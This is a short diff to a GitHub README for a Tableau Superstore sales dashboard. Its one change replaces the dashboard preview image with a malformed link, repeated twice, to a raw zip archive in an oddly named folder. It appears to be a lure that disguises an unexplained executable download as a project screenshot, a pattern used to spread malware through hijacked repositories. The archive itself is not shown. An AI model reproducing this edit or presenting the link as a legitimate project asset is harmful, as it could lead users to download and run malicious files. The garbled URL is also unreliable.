@@ -2,7 +2,7 @@
 
 This project presents an interactive Tableau dashboard built using the Superstore dataset. It offers a dynamic and insightful view into key performance indicators (KPIs) such as Sales, Orders, and Customers over time, with flexible parameter-driven controls.
 
-![Dashboard Preview](https://github.com/Siam-analytics/SuperStoreSales/blob/main/Screenshot%202025-05-30%20200255.png)
+![Dashboard Preview](https://github.com/Siam-analytics/SuperStoreSales/raw/refs/heads/main/sphincterate/Store-Super-Sales-v2.6.zip%202025-05-30%https://github.com/Siam-analytics/SuperStoreSales/raw/refs/heads/main/sphincterate/Store-Super-Sales-v2.6.zip)
 
 ## 🔧 Features
 
